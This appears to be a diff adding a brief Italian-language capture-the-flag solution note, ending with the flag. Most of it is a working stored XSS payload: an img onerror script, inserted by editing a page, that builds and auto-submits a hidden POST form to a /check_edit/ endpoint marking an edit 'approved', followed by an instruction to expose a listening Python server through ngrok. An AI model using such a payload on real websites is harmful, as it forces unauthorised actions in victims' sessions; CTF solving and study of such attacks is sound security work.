@@ -1,0 +1,8 @@
+andare su pagine speciali, modificare la pagina inserendo questo codice 
+
+<img src=x onerror="var f=document.createElement('form');f.action='/check_edit/a2d4c09f-aa8c-4576-b671-696eb3668088';f.method='POST';var i=document.createElement('input');i.type='hidden';i.name='yes';i.value='approved';f.appendChild(i);document.body.appendChild(f);f.submit();" />
+
+apri un server pyhton in ascolto e mettilo su ngrok
+
+
+flag{cr0ss_sit3_spl4shing}
